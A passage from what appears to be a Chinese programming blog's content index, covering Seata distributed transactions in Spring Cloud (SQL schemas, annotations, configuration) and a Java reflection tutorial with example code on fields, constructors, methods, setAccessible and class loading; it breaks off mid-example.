30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 CREATE DATABASE IF NOT EXISTS `storage_db`; USE `storage_db`; DROP TABLE IF EXISTS `storage_tbl`; CREATE TABLE `storage_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `commodity_code` varchar(255) DEFAULT NULL, `count` int(11) DEFAULT 0, PRIMARY KEY (`id`), UNIQUE KEY (`commodity_code`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; INSERT INTO storage_tbl (commodity_code, count) VALUES (\u0026#39;P0001\u0026#39;, 100); INSERT INTO storage_tbl (commodity_code, count) VALUES (\u0026#39;B1234\u0026#39;, 10); -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; CREATE DATABASE IF NOT EXISTS `order_db`; USE `order_db`; DROP TABLE IF EXISTS `order_tbl`; CREATE TABLE `order_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` varchar(255) DEFAULT NULL, `commodity_code` varchar(255) DEFAULT NULL, `count` int(11) DEFAULT 0, `money` int(11) DEFAULT 0, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; CREATE DATABASE IF NOT EXISTS `account_db`; USE `account_db`; DROP TABLE IF EXISTS `account_tbl`; CREATE TABLE `account_tbl` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` varchar(255) DEFAULT NULL, `money` int(11) DEFAULT 0, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; INSERT INTO account_tbl (user_id, money) VALUES (\u0026#39;1\u0026#39;, 10000); -- 注意此处0.3.0+ 增加唯一索引 ux_undo_log DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; ApiPost接口测试 Apipost-API 文档、设计、调试、自动化测试一体化协作平台\n根据代码逻辑创建对应接口\n本地事务测试 @Transactional注解是 Spring 提供的声明式事务管理注解，用于标记方法或类，使其在方法执行期间自动管理事务（开启、提交或回滚）。\n使用@Transactional注解时需要在自己的启动类上添加@EnableTransactionManagement注解才能正常使用\n1 2 3 4 5 6 7 8 @Transactional 本地事务 //当使用Transactional注解时，如果count=5那么会自动回滚事务 @Override public void deduct(String commodityCode, int count) { storageTblMapper.deduct(commodityCode, count); if (count == 5) { throw new RuntimeException(\u0026#34;库存不足\u0026#34;); } } 打通远程调用 使用OpenFeign远程调用对应的微服务\n采购business需要远程调用库存服务和订单服务，那么在采购模块中创建OpenFeign\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Service public class BusinessServiceImpl implements BusinessService { @Autowired StorageFeignClient storageFeignClient; @Autowired OrderFeignClient orderFeignClient; @GlobalTransactional @Override public void purchase(String userId, String commodityCode, int orderCount) { //1. 扣减库存 storageFeignClient.deduct(commodityCode, orderCount); //2. 创建订单 orderFeignClient.create(userId, commodityCode, orderCount); } } 引入Seata解决分布式事务 下载Seata服务 Seata Java Download | Apache Seata\n1 2 3 4 seata-server.bat //直接运行即可 http://127.0.0.1:7091/#/login //Web界面地址 默认账户密码：seata/seata http://127.0.0.1:8091 //监听地址 项目文件中引入Seata依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-seata\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在每个项目的配置文件中创建一个名为file.conf的文件，内容如下\n1 2 3 4 5 6 7 8 9 10 service { #transaction service group mapping vgroupMapping.default_tx_group = \u0026#34;default\u0026#34; #only support when registry.type=file, please don\u0026#39;t set multiple addresses default.grouplist = \u0026#34;127.0.0.1:8091\u0026#34; #degrade, current not support enableDegrade = false #disable seata disableGlobalTransaction = false } 使用Seata 使用Seata需要在最开始的请求地方加上@GlobalTransactional注解\n@GlobalTransactional 是 Seata 提供的一个注解，用于声明一个方法或类需要进行 全局事务管理。它是 Seata 分布式事务解决方案的核心注解之一，用于确保跨多个微服务或数据库的操作要么全部成功，要么全部回滚。\n1 2 3 4 5 6 7 8 9 @GlobalTransactional @Override public void purchase(String userId, String commodityCode, int orderCount) { //1. 扣减库存 storageFeignClient.deduct(commodityCode, orderCount); //2. 创建订单 orderFeignClient.create(userId, commodityCode, orderCount); } Seata原理 二阶提交协议 二阶提交协议：事务提交分为两个阶段，第一阶段是本地事务提交，包含（业务修改数据的提交和undo_log日志的提交）。第二阶段只有两个步骤（成功提交和失败回滚），如果成功提交，所以人删除undo_log日志。如果提交失败，所有人拿到自己的前镜像，恢复数据，删除undo_log\n四种事务模式 Seata AT 模式 | Apache Seata\n默认使用AT模式，如果想使用其它模式，可以在配置文件中添加\n1 2 seata: data-source-proxy-mode: XA ","date":"2025-06-10T14:11:55+08:00","image":"https://lserein.github.io/p/seata/Seata_hu_3e17fd9a8bb95161.png","permalink":"https://lserein.github.io/p/seata/","title":"Seata"},{"content":"1.Java反射专题 反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息（比如成员变量，构造器，成员方法等等)，并能操作对像的属性及方法。反射在设计模式和框架底层都会用到。反射面前一切都是纸老虎\n1.1.反射是什么\u0026mdash;一个需求引出反射 1 2 3 根据配置文件re.properties内容，创建Cat对象并调用hi方法 classfullpath=com.edu.Cat method=hi 开闭原则（ocp原则）：不修改源码，来扩展功能\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class Question { public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //根据配置文件re.properties内容，创建Cat对象并调用hi方法 //使用之前学的无法解决，只能使用反射进行解决 //使用Properties类读取配置文件 Properties properties = new Properties(); properties.load(new FileInputStream(\u0026#34;src\\\\re.properties\u0026#34;)); String classfullpath = properties.get(\u0026#34;classfullpath\u0026#34;).toString(); String methodName = properties.get(\u0026#34;method\u0026#34;).toString(); System.out.println(classfullpath); System.out.println(methodName); //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); } } 1.2.反射原理图 这张图片展示了Java程序的三个主要阶段：代码阶段/编译阶段、Class类阶段（加载阶段）和Runtime运行阶段。\n1 2 3 在这个阶段，开发者编写Java源代码文件，例如Cat.java。 代码中定义了类Cat，包括私有字符串变量name、公共构造函数Cat()和公共方法hi()。 通过Java编译器，源代码被编译成字节码文件Cat.class。 1 2 3 在这个阶段，类加载器（ClassLoader）将字节码文件Cat.class加载到内存中。 加载后，形成了Class对象，包含了类的元数据，如成员变量（Field）、构造器（Constructor）和成员方法（Method）。 这些元数据存储在堆内存中，供后续的运行时使用。 1 2 3 4 5 6 在运行时阶段，Java虚拟机（JVM）执行字节码。 通过new Cat()创建Cat类的实例对象cat。 该对象知道它属于哪个Class对象，并且可以通过该Class对象访问其元数据。 得到Class对象后，可以进行以下操作： 创建对象，调用构造函数。 操作对象的属性和方法。 1.3.反射机制 1.3.1.java.lang.reflect.Field\u0026mdash;获取某个类的字段 ** java.lang.reflect.Field:代表类的成员变量，Field类表示某个类的成员变量**\n获取某个类的字段\ngetField不能获取private修饰的私有属性\ngetDeclaredField可用来获取私有属性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package com.edu.reflection; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Properties; public class Reflection1 { public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException { //使用Properties类读取配置文件 Properties properties = new Properties(); properties.load(new FileInputStream(\u0026#34;src\\\\re.properties\u0026#34;)); String classfullpath = properties.get(\u0026#34;classfullpath\u0026#34;).toString(); String methodName = properties.get(\u0026#34;method\u0026#34;).toString(); //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); //java.lang.reflect.Field:代表类的成员变量，Field类表示某个类的成员变量 //获取某个类的字段 // getField不能获取私有的属性 Field name = cls.getField(\u0026#34;age\u0026#34;); System.out.println(name.get(object)); //10 //getDeclaredField可用来获取私有属性 Field name1 = cls.getDeclaredField(\u0026#34;name\u0026#34;); name1.setAccessible(true); System.out.println(name1.get(object)); } } 1.3.2.java.lang.reflect.Constructor：获取构造器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 java.lang.reflect.Constructor：代表类的构造方法，Constructor表示构造器 //1.加载类,返回class类型的对象cls Class cls = Class.forName(classfullpath); //2.通过cls得到你加载类的对象示例 Object object = cls.newInstance(); System.out.println(\u0026#34;object对象的运行类型\u0026#34;+object.getClass()); //运行类型 //3.通过cls得到你加载的类com.edu.Cat的methodName \u0026#34;hi\u0026#34;对象 //即：在反射中，可以把方法视为对象，万物皆对象 Method method1 = cls.getMethod(methodName); //通过method1调用方法invode method1.invoke(object); //java.lang.reflect.Constructor：代表类的构造方法，Constructor表示构造器 //获取无参构造器 Constructor constructor = cls.getConstructor(); System.out.println(constructor); //获取有参构造器 Constructor constructor1 = cls.getConstructor(String.class); //这里的String.class就是String类的Class对象 System.out.println(constructor1); 1.4.反射的优点与缺点 优点：可以动态的创建和使用对象（也是框架底层核心），使用灵活，没有反射机制，框架技术就失去底层支撑。\n缺点：使用反射是基于解释执行，对执行速度有影响\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 public class Reflection2 { public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException { m1(); m2(); m3(); } //使用传统方法创建Cat对象耗时 public static void m1(){ long start = System.currentTimeMillis(); for (int i = 0;i\u0026lt;1000000;i++){ Cat cat = new Cat(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;传统方法耗时：\u0026#34;+(end-start)); } public static void m2() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { long start = System.currentTimeMillis(); Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Object o = cls.newInstance(); Method hi = cls.getMethod(\u0026#34;hi\u0026#34;); for (int i = 0;i\u0026lt;1000000;i++){ hi.invoke(o); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;反射方法耗时：\u0026#34;+(end-start)); } public static void m3() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { long start = System.currentTimeMillis(); Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Object o = cls.newInstance(); Method hi = cls.getMethod(\u0026#34;hi\u0026#34;); hi.setAccessible(true); for (int i = 0;i\u0026lt;1000000;i++){ hi.invoke(o); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;反射方法耗时：\u0026#34;+(end-start)); } } 1.5.通过反射获取类的结构信息 //getName：获取全类名\n//getSimpleName:获取简单类名\n//getFields:获取所有public修饰的属性，包括本类以及父类的\n//getDeclaredFields:获取本类中所有属性\n//getMethods:获取所有public修饰的方法，包含本类以及父类\n//getDeclaredMethods:获取本类中所有方法\n//getConstructors:获取public修饰的构造器，只包含本类不包含父类\n//getDeclaredConstructors:获取本类中所有构造器\n//getPackage:以package形式返回包信息\n//getSuperclass:以class形式返回父类信息\n//getInterfaces:以Class形式返回接口信息\n//getAnnotations:以Annotation[]形式返回注解信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 package com.edu.reflection; import org.junit.Test; import java.lang.annotation.Annotation; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.Method; /* * 演示如何通过反射获取类的结构信息 * */ public class ReflectionUtils { public static void main(String[] args) { } //第一组方法API @Test public void api01() throws ClassNotFoundException { //得到class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.reflection.Person\u0026#34;); //getName：获取全类名 System.out.println(cls.getName()); //com.edu.reflection.Person //getSimpleName:获取简单类名 System.out.println(cls.getSimpleName());//Person //getFields:获取所有public修饰的属性，包括本类以及父类的 Field[] fields = cls.getFields(); for (Field field : fields) { System.out.println(field.getName()); //hobby,name } //getDeclaredFields:获取本类中所有属性 Field[] declaredFields = cls.getDeclaredFields(); for (Field declaredField : declaredFields) { System.out.println(declaredField.getName()); //name,age,job,sal } //getMethods:获取所有public修饰的方法，包含本类以及父类 Method[] methods = cls.getMethods(); for (Method method : methods) { System.out.println(method.getName()); } //getDeclaredMethods:获取本类中所有方法 Method[] declaredMethods = cls.getDeclaredMethods(); for (Method declaredMethod : declaredMethods) { System.out.println(declaredMethod.getName()); } //getConstructors:获取public修饰的构造器，只包含本类 Constructor\u0026lt;?\u0026gt;[] constructors = cls.getConstructors(); //getDeclaredConstructors:获取本类中所有构造器 Constructor\u0026lt;?\u0026gt;[] declaredConstructors = cls.getDeclaredConstructors(); //getPackage:以package形式返回包信息 System.out.println(cls.getPackage()); //com.edu.reflection //getSuperclass:以class形式返回父类信息 Class\u0026lt;?\u0026gt; superclass = cls.getSuperclass(); System.out.println(superclass); //com.edu.reflection.A //getInterfaces:以Class形式返回接口信息 Class\u0026lt;?\u0026gt;[] interfaces = cls.getInterfaces(); for (Class\u0026lt;?\u0026gt; anInterface : interfaces) { System.out.println(anInterface.getName()); } //getAnnotations:以Annotation[]形式返回注解信息 Annotation[] annotations = cls.getAnnotations(); System.out.println(annotations); //Deprecated } } class A{ public String hobby; public void hi(){} } interface IA{ } interface IB{ } @Deprecated class Person extends A implements IA,IB{ //四种不同访问权限的属性 public String name; protected int age; String job; private double sal; public void m1(){} protected void m2(){} void m3(){} private void m4(){} } //getModifiers：以int形式返回修饰符，默认修饰符是0，public是1，private是2，protected是4，static是8，final是16\n如果有属性是punlic(1) static(8) = 9 修饰，那么他的结果是相加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public void api02() throws ClassNotFoundException{ //得到class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.reflection.Person\u0026#34;); //getDeclaredFields:获取本类中所有属性 Field[] declaredFields = cls.getDeclaredFields(); for (Field declaredField : declaredFields) { System.out.println(declaredField.getName()); //name,age,job,sal System.out.println(\u0026#34;该属性的修饰符值=\u0026#34;+declaredField.getModifiers()); System.out.println(\u0026#34;该属性对应的类型\u0026#34;+declaredField.getType()); //class java.lang.String } //getDeclaredMethods:获取本类中所有方法 Method[] declaredMethods = cls.getDeclaredMethods(); for (Method declaredMethod : declaredMethods) { System.out.println(\u0026#34;本类中所有方法：\u0026#34;+declaredMethod.getName()); System.out.println(\u0026#34;本类中方法所对应修饰符的值\u0026#34;+declaredMethod.getModifiers()); System.out.println(\u0026#34;该方法返回类型\u0026#34;+declaredMethod.getReturnType()); //void //输出当前这个方法的形参数组情况 Class\u0026lt;?\u0026gt;[] parameterTypes = declaredMethod.getParameterTypes(); for (Class\u0026lt;?\u0026gt; parameterType : parameterTypes) { System.out.println(\u0026#34;该方法的形参类型\u0026#34;+parameterType); } } } 1.6.通过反射爆破创建对象实例 方法1：调用类中的public修饰的无参构造器\n方法2：调用类中的指定构造器\nClass类相关方法：\n1 2 3 newInstance：调用类中的无参构造器，获取对应类的对象 getConstructor(Class...clazz)：根据参数列表，获取对应的public构造器对象 getDecalaredConstructor(Class...clazz):根据参数列表，获取对应的所有构造器对象 Constructor类相关方法：\n1 2 setAccessible：爆破 newInstance(Object...obj):调用构造器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.edu; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; /* * 演示通过反射机制创建实例 * */ public class CreateInstance { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //1.先获取User类的Class对象 Class\u0026lt;?\u0026gt; Userclass = Class.forName(\u0026#34;com.edu.User\u0026#34;); //2.通过public的无参构造器创建实例 Object o = Userclass.newInstance(); System.out.println(o); //姓名为张三*******年龄为13 //3.通过public的有参构造器创建实例 //此时此刻，这个constructor对象就是下面这个构造器 /* * public User(String name){ //public有参构造器 this.name = name; */ //3.1.先得到对应的构造器,getConstructor返回public的构造器 Constructor\u0026lt;?\u0026gt; constructor = Userclass.getConstructor(String.class); //3.2.创建实例，并传入实参 Object lisi = constructor.newInstance(\u0026#34;lisi\u0026#34;); System.out.println(lisi); //姓名为lisi*******年龄为13 //4.通过非public的有参构造器创建实例---私有 Constructor\u0026lt;?\u0026gt; declaredConstructor = Userclass.getDeclaredConstructor(int.class, String.class); declaredConstructor.setAccessible(true); //爆破，使用反射可以访问私有的private构造器 Object o1 = declaredConstructor.newInstance(18,\u0026#34;wangwu\u0026#34;); System.out.println(o1); } } class User{ private int age = 13; private String name = \u0026#34;张三\u0026#34;; public User(){} //无参 public public User(String name){ //public有参构造器 this.name = name; } private User(int age,String name){ //有参 私有 this.age = age; this.name = name; } @Override public String toString() { return \u0026#34;姓名为\u0026#34;+name+\u0026#34;*******年龄为\u0026#34;+age; } } 1.7.通过反射爆破操作属性 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package com.edu; import java.lang.reflect.Field; /* * 演示反射访问操作属性 * */ public class ReflectAccess { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException { //1.得到Student类对应的class对象 Class\u0026lt;?\u0026gt; StuClass = Class.forName(\u0026#34;com.edu.Student\u0026#34;); //2.创建一个对象 Object o = StuClass.newInstance(); //o的运行类型为Student //3.使用反射得到age属性对象 Field age = StuClass.getField(\u0026#34;age\u0026#34;); //通过反射操作age属性 age.set(o,18); //反射操作name属性，name属性私有且静态 Field name = StuClass.getDeclaredField(\u0026#34;name\u0026#34;); //对name进行爆破 name.setAccessible(true); //name.set(o,\u0026#34;张三\u0026#34;); name.set(null,\u0026#34;张三\u0026#34;); //因为name有static属性，所以o也可以写成null System.out.println(o); } } class Student{ public int age; private static String name; public Student(){ } @Override public String toString() { return \u0026#34;Student{\u0026#34; + \u0026#34;age=\u0026#34; + age + \u0026#34;.......\u0026#34; + \u0026#34;name\u0026#34; + name + \u0026#39;}\u0026#39;; } } 1.8.通过反射爆破操作方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package com.edu; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /* * 演示反射调用方法 * */ public class ReflectAccessMethod { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { //1.得到Boss类对应的class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;com.edu.Boss\u0026#34;); //2.创建对象 Object o = cls.newInstance(); //3.得到hi方法对象 Method hi = cls.getMethod(\u0026#34;hi\u0026#34;,String.class); //4.调用方法 Object invoke = hi.invoke(o,\u0026#34;666\u0026#34;); Method say = cls.getDeclaredMethod(\u0026#34;say\u0026#34;, int.class, String.class, char.class); say.setAccessible(true); Object invoke1 = say.invoke(o, 100, \u0026#34;张三\u0026#34;, \u0026#39;男\u0026#39;); System.out.println(invoke1); //因为say方法是静态的，所以对象位置可以使用null代替 System.out.println(say.invoke(null, 99, \u0026#34;小红\u0026#34;, \u0026#39;女\u0026#39;)); //5.在反射中，如果方法有返回值，统一返回object } } class Boss{ public int age; private static String name; public Boss(){} private static String say(int n,String s,char c){ return n + \u0026#34;\u0026#34; + s + \u0026#34;\u0026#34; + c; } public void hi(String s){ System.out.println(\u0026#34;hi\u0026#34;+s); } } 1.9.小练习 利用反射和File完成以下功能\n1.利用Class类的forName方法得到File类的class对象\n2.在控制台打印File类的所有构造器\n3.通过newInstance的方法创建File对象，并创建mynew.txt文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package com.edu.homework; import java.io.File; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /* * */ public class homework2 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { //1.利用Class类的forName方法得到File类的class对象 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;java.io.File\u0026#34;); //2.得到所有构造器 Constructor\u0026lt;?\u0026gt;[] declaredConstructors = cls.getDeclaredConstructors(); for (Constructor\u0026lt;?\u0026gt; declaredConstructor : declaredConstructors) { System.out.println(\u0026#34;File的构造器\u0026#34;+declaredConstructor); } //3.通过指定构造器创建文件file对象 Constructor\u0026lt;?\u0026gt; declaredConstructor = cls.getDeclaredConstructor(String.class); String filepath = \u0026#34;E:\\\\mynew.txt\u0026#34;; Object fileobject = declaredConstructor.newInstance(filepath); //创建file对象，运行类型就是File //4.得到createNewFile的方法对象 Method createNewFile = cls.getMethod(\u0026#34;createNewFile\u0026#34;); createNewFile.invoke(fileobject); //创建文件，调用createNewFile // System.out.println(fileobject.getClass()); System.out.println(\u0026#34;创建文件成功：\u0026#34;+filepath); } } 2.Class类 1 2 3 4 5 6 7 8 1.Class也是类，因此也继承object类[类图] 2.Class类对象不是new出来的，而是系统创建的 3.对于某个类的Class类对象，在内存中只有一份，因为类只加载一次 4.每个类的实例都会记得自己是由哪个Class实例所生成 5.通过Class可以完整地得到一个类的完整结构,通过一系列API 6.Class对象是存放在堆的 7.类的字节码二进制数据，是放在方法区的，有的地方称为类的元数据（包括方法代码， 变量名，方法名，访问权限等等) https://www.zhihu.com/question/38496907\n1 2 3 4 5 //3.对于某个类的Class类对象，在内存中只有一份，因为类只加载一次 Class\u0026lt;?\u0026gt; cls1 = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); Class\u0026lt;?\u0026gt; cls2 = Class.forName(\u0026#34;com.edu.Cat\u0026#34;); System.out.println(cls1.hashCode()); System.out.println(cls2.hashCode()); 2.1.Class类常用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package com.edu.Class; import com.edu.Car; import java.lang.reflect.Field; public class class2 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException { String classPath = \u0026#34;com.edu.Car\u0026#34;; //1.获取Car类对应的Class对象 //\u0026lt;?\u0026gt;表示不确定的Java类型 Class\u0026lt;?\u0026gt; cls = Class.forName(classPath); System.out.println(cls); //显示cls对象，是哪个类的Class对象 com.edu.Car System.out.println(cls.getClass()); //输出cls的运行类型 java.lang.Class //2.得到包名 ---- getPackage().getName() System.out.println(cls.getPackage().getName()); //com.edu //3.得到全类名 ----- getName() System.out.println(cls.getName()); //com.edu.Car //4.通过cls创建对象实例 ----newInstance() Car car = (Car)cls.newInstance(); System.out.println(car); //Car{brand=\u0026#39;宝马\u0026#39;, price=19999999, color=\u0026#39;红色\u0026#39;} //5.通过反射获取属性 ---getField Field field = cls.getField(\u0026#34;brand\u0026#34;); System.out.println(field.get(car)); //宝马 //6.通过反射修改属性 -------field.set(car,\u0026#34;奔驰\u0026#34;); field.set(car,\u0026#34;奔驰\u0026#34;); System.out.println(field.get(car)); //奔驰 //7.我希望获取到所有属性 --------cls.getFields() Field[] fields = cls.getFields(); for (Field field1 : fields) { System.out.println(field1.getName()); //brand price color } } } 2.2.获取Class对象的六种方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 /* * 获取class对象的各种方式 * */ public class GetClass { public static void main(String[] args) throws ClassNotFoundException { //1.已知一个类的全类名，且在类的类路径下，可通过Class的静态方法forname()获取 //应用场景：多用于配置文件，读取全路径加载类 Class\u0026lt;?\u0026gt; cls1 = Class.forName(\u0026#34;com.edu.Car\u0026#34;); System.out.println(cls1); //2.若知道具体类，通过类的class获取，该方式是最安全可靠，程序性能最高实例 //应用场景：多用于参数传递，比如通过反射得到对应构造器对象 Class\u0026lt;Car\u0026gt; cls2 = Car.class; System.out.println(cls2); //3.已知某个类的实例，调用该实例的getClass()方法获取Class对象 //应用场景：通过创建好的对象，获取Class对象 Car car = new Car(); Class\u0026lt;? extends Car\u0026gt; cls3 = car.getClass(); System.out.println(cls3); //4.通过类加载器【有4种类加载器】获取到类的Class对象 //(1)先获取类加载器 Car ClassLoader classLoader = car.getClass().getClassLoader(); //(2)通过类加载器得到class对象 Class\u0026lt;?\u0026gt; cls4 = classLoader.loadClass(\u0026#34;com.edu.Car\u0026#34;); System.out.println(cls4); //cls1 cls2 cls3 cls4其实是同一个对象 System.out.println(cls1.hashCode()); System.out.println(cls2.hashCode()); System.out.println(cls3.hashCode()); System.out.println(cls4.hashCode()); //5.基本数据类型(int,char,boolean,float,double,byte,long,short) //获取Class对象 Class cls5 = long.class; System.out.println(cls5); //6.基本数据类型对应的包装类，可通过.type得到Class类对象 Class cls6 = Integer.TYPE; System.out.println(cls6); } } 2.3.哪些类型有Class对象 1.外部类，成员内部类，静态内部类，局部内部类，匿名内部类\n2.interface 接口\n3.数组\n4.enum 枚举类型\n5.annotation：注解\n6.基本数据类型\n7.Void\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.edu.Class; import java.io.Serializable; public class AlltypeClass { public static void main(String[] args) { Class\u0026lt;String\u0026gt; cls1 = String.class; //外部类 Class\u0026lt;Serializable\u0026gt; cls2 = Serializable.class; //接口 Class\u0026lt;Integer[]\u0026gt; cls3 = Integer[].class; //数组 Class\u0026lt;float[][]\u0026gt; cls4 = float[][].class; //二维数组 Class\u0026lt;Deprecated\u0026gt; cls5 = Deprecated.class; //注解 Class\u0026lt;Thread.State\u0026gt; cls6 = Thread.State.class; //枚举 Class\u0026lt;Long\u0026gt; cls7 = long.class; //基本数据类型 Class\u0026lt;Void\u0026gt; cls8 = void.class; //void类型 Class\u0026lt;Class\u0026gt; cls9 = Class.class; // } } 3.类加载 3.1.动态加载与静态加载 静态加载：编译时加载相关类，如果没用则报错，依赖性太强\n动态加载：运行时加载需要的类，如果运行时不用该类，则不报错，降低了依赖性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class Classload1 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Scanner sc = new Scanner(System.in); System.out.println(\u0026#34;请输入key\u0026#34;); String key = sc.next(); 